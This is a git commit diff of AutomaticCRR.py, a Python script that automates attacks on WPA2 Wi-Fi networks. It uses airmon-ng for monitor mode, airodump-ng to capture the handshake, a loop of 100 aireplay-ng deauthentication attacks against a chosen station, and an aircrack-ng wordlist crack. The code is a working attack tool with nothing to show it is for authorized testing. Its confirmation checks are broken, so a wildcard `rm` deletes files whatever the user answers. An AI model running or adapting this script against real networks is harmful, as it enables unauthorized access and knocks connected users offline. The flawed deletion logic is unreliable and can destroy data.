7afb091548483d6cad70ca6e162cb8704316cd5a
Nux404 <78324112+Nux404@users.noreply.github.com>
2021-02-04 19:18:09 +0100

    AutomaticCRR.py V4

--- AutomaticCRR.py
+++ AutomaticCRR.py
@@ -24,7 +24,15 @@ while PATH_Validity != True:
 	PATH_Validity = os.path.exists(f"{PATH_2}")
 	PATH = PATH_2
 
-os.system(f"cd {PATH}")
+if os.path.exists(f"{PATH}AutomaticCRR"):
+	PATH = f"{PATH}AutomaticCRR/"
+	os.system(f"cd {PATH}")
+	print(f"All your data saved on the file {PATH} will be deleted.")
+	rm = input("Do you want ton continue [y/n] (MANDATORY FOR PROGRAM USE) : ")
+	if rm == "y" or "Y":
+		os.system(f"rm .{PATH}*")
+	else:
+		exit()
 
 if not os.path.exists("AutomaticCRR"):
 	os.makedirs(f"AutomaticCRR")
@@ -33,52 +41,51 @@ PATH = (f"{PATH}AutomaticCRR/")
 
 os.system("clear")
 
-while True:
-
-	os.system("airmon-ng")
-	INTERFACE = input("Enter the interface of your network card : ")
+os.system("airmon-ng")
+INTERFACE = input("Enter the interface of your network card : ")
 	
-	os.system(f"airmon-ng start {INTERFACE}")
-	os.system("clear")
-	os.system("airmon-ng")
+os.system(f"airmon-ng start {INTERFACE}")
+os.system("clear")
+os.system("airmon-ng")
 
-	INTERFACE_2 = input("Retape the interface of your network card : ")
-	os.system("clear")
+INTERFACE_2 = input("Retape the interface of your network card : ")
+os.system("clear")
 
-	os.system(f"gnome-terminal -- airodump-ng {INTERFACE_2}")
+os.system(f"gnome-terminal -- airodump-ng {INTERFACE_2}")
 
-	BSSID = input("Enter the BSSID to crack : ")
-	time.sleep(3)
-	CHANNEL = input("Enter the CHANNEL of the network to crack : ")
+BSSID = input("Enter the BSSID to crack : ")
+time.sleep(3)
+CHANNEL = input("Enter the CHANNEL of the network to crack : ")
 
-	os.system(f"gnome-terminal -- airodump-ng -c {CHANNEL} --bssid {BSSID} -w {PATH} {INTERFACE_2}")
-	time.sleep(12)
+os.system(f"gnome-terminal -- airodump-ng -c {CHANNEL} --bssid {BSSID} -w {PATH} {INTERFACE_2}")
+time.sleep(12)
 
-	STATION = input("Enter the STATION of the network to crack : ")
-	os.system("clear")
+STATION = input("Enter the STATION of the network to crack : ")
+os.system("clear")
 
-	while aireplay != 100:
-		aireplay = aireplay + 1
-		os.system(f"aireplay-ng -0 1 -a {BSSID} -c {STATION} {INTERFACE_2}")
+while aireplay != 100:
+	aireplay = aireplay + 1
+	os.system(f"gnome-terminal -- aireplay-ng -0 1 -a {BSSID} -c {STATION} {INTERFACE_2}")
 
-	os.system("clear")
+time.sleep(1)
+os.system("clear")
 
-	PATH_LST = input("Enter the list directory : ")
-	PATH_Validity = os.path.exists(PATH_LST)
+PATH_LST = input("Enter the list directory : ")
+PATH_Validity = os.path.exists(PATH_LST)
 
-	while PATH_Validity != True:
-		PATH_2 = input("Please enter a valid path : ")
-		PATH_Validity = os.path.exists(f"{PATH_2}")
-		PATH_LST = PATH_2
+while PATH_Validity != True:
+	PATH_2 = input("Please enter a valid path : ")
+	PATH_Validity = os.path.exists(f"{PATH_2}")
+	PATH_LST = PATH_2
 
-	os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")
+os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")
 
+retry = input("Do you want to try again with another list ? [y/n] : ")
+time.sleep(0.3)
+
+if retry == "y" or "Y":
+	PATH_LST_RETRY = input("Enter the list directory : ")
+	os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST_RETRY} {PATH}-01.cap")
 	retry = input("Do you want to try again with another list ? [Y/N] : ")
-	time.sleep(0.3)
-
-	if retry == "Y":
-		PATH_LST_RETRY = input("Enter the list directory : ")
-		os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST_RETRY} {PATH}-01.cap")
-		retry = input("Do you want to try again with another list ? [Y/N] : ")
-	else:
-		break
+else:
+	exit()
